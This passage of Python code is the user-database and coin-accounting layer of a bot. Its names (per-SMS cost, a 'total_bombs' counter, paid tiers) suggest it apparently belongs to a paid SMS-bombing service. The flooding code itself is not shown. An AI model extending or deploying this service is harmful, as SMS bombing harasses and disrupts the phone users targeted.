DAILY_BONUS_COINS = 10
LOW_SMS_COST = 10

# ============================================================
# DATABASE
# ============================================================

db_lock = threading.Lock()

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_db(data):
    with db_lock:
        with open(DB_FILE, "w") as f:
            json.dump(data, f, indent=2)

def get_user(user_id):
    db = load_db()
    uid = str(user_id)
    if uid not in db:
        db[uid] = {
            "username": "",
            "first_name": "",
            "tier": "free",
            "paid_tiers": [],
            "coins": 0,
            "last_bonus_claim": "",
            "total_bombs": 0,
            "total_coins_earned": 0,
            "joined_date": str(date.today()),
            "banned": False
        }
        save_db(db)
    return db[uid]

def update_user(user_id, data):
    db = load_db()
    uid = str(user_id)
    if uid not in db:
        get_user(user_id)
        db = load_db()
    db[uid].update(data)
    save_db(db)

def is_admin(user_id):
    return str(user_id) == str(ADMIN_USER_ID)

def can_claim_bonus(user_id):
    user = get_user(user_id)
    return user.get("last_bonus_claim") != str(date.today())

def claim_bonus(user_id):
    user = get_user(user_id)
    user["coins"] = user.get("coins", 0) + DAILY_BONUS_COINS
    user["last_bonus_claim"] = str(date.today())
    user["total_coins_earned"] = user.get("total_coins_earned", 0) + DAILY_BONUS_COINS
    update_user(user_id, user)
    return user["coins"]

def has_enough_coins(user_id, amount=LOW_SMS_COST):
    user = get_user(user_id)
    return user.get("coins", 0) >= amount

def spend_coins(user_id, amount=LOW_SMS_COST):
    user = get_user(user_id)
    user["coins"] = user.get("coins", 0) - amount
    user["total_bombs"] = user.get("total_bombs", 0) + 1
    update_user(user_id, user)
    return user["coins"]

def add_paid_tier(user_id, tier):
    user = get_user(user_id)
    if tier not in user.get("paid_tiers", []):
        user["paid_tiers"].append(tier)
    user["tier"] = "paid"
    update_user(user_id, user)

def remove_paid_tier(user_id, tier=None):
    user = get_user(user_id)
    if tier and tier in user.get("paid_tiers", []):
        user["paid_tiers"].remove(tier)
    else:
        user["paid_tiers"] = []
    if not user["paid_tiers"]:
        user["tier"] = "free"
    update_user(user_id, user)

